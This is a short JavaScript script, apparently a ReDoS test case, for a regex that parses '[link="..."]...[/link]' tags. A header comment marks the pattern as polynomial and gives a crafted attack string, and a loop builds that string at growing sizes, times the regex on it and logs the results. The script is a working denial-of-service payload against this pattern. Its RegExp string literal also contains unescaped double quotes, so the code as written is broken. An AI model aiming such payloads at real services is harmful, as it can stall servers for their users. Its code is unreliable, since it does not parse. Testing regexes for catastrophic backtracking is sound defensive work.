/* 1470
 * \[link="(?<link>((.|\n)*?))"\](?<text>((.|\n)*?))\[\/link\]
 * POLYNOMIAL
 * nums:3
 * POLYNOMIAL AttackString:"[link=""+""]"*5000+"◎@! _1_POA(i)"
 */
var REGEX = new RegExp("\[link="(?<link>((.|\n)*?))"\](?<text>((.|\n)*?))\[\/link\]")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '[link=\"' + '\"]'.repeat(i*10000) + '◎@! _1_POA(i)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 10000 + ": " + time_cost+" ms")
}